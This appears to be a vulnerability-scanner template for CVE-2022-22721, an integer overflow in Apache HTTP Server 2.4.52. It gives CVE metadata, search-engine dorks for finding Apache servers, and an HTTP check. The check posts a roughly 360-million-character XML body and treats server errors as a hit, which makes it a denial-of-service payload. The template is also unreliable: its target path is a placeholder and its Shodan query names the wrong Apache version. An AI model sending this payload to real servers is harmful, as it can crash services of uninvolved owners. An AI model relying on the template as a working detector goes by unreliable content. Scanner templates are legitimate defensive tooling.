id: CVE-2022-22721

info:
  name: Apache HTTP Server 2.4.52 Integer Overflow Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: If LimitXMLRequestBody is set to allow request bodies larger than 350MB on 32 bit systems, an integer overflow occurs causing out of bounds writes. This issue affects Apache HTTP Server 2.4.52 and earlier.
  impact: |
    Successful exploitation could lead to remote code execution or DoS.
  remediation: |
    Upgrade Apache HTTP Server to version 2.4.53 or later to mitigate CVE-2022-22721.
  reference:
    - http://seclists.org/fulldisclosure/2022/May/33
    - http://seclists.org/fulldisclosure/2022/May/35
    - http://seclists.org/fulldisclosure/2022/May/38
    - http://www.openwall.com/lists/oss-security/2022/03/14/2
    - https://lists.debian.org/debian-lts-announce/2022/03/msg00033.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
    cvss-score: 9.1
    cve-id: CVE-2022-22721
    cwe-id: CWE-190
    epss-score: 0.00459
    epss-percentile: 0.76069
    cpe: cpe:2.3:a:apache:http_server:*:*:*:*:*:*:*:*
  metadata:
    vendor: apache
    product: http_server
    shodan-query: Apache 2.4.49
    fofa-query:
      - title="apache http server test page powered by centos"
      - title="apache+default","apache+http+server+test","apache2+it+works"
      - title="apache2 debian default page:"
      - title="test page for the ssl/tls-aware apache installation on web site"
    google-query:
      - intitle:"apache http server test page powered by centos"
      - intitle:"apache+default","apache+http+server+test","apache2+it+works"
      - intitle:"apache2 debian default page:"
      - intitle:"test page for the ssl/tls-aware apache installation on web site"

http:
  - method: POST
    path:
      - "{{BaseURL}}/path-that-accepts-xml"

    headers:
      Content-Type: application/xml

    body: |
      <?xml version="1.0"?>
      <data>
        {{repeat('A', 360000000)}}
      </data>
    matchers:
      - type: status
        status:
          - 500
          - 502
          - 503
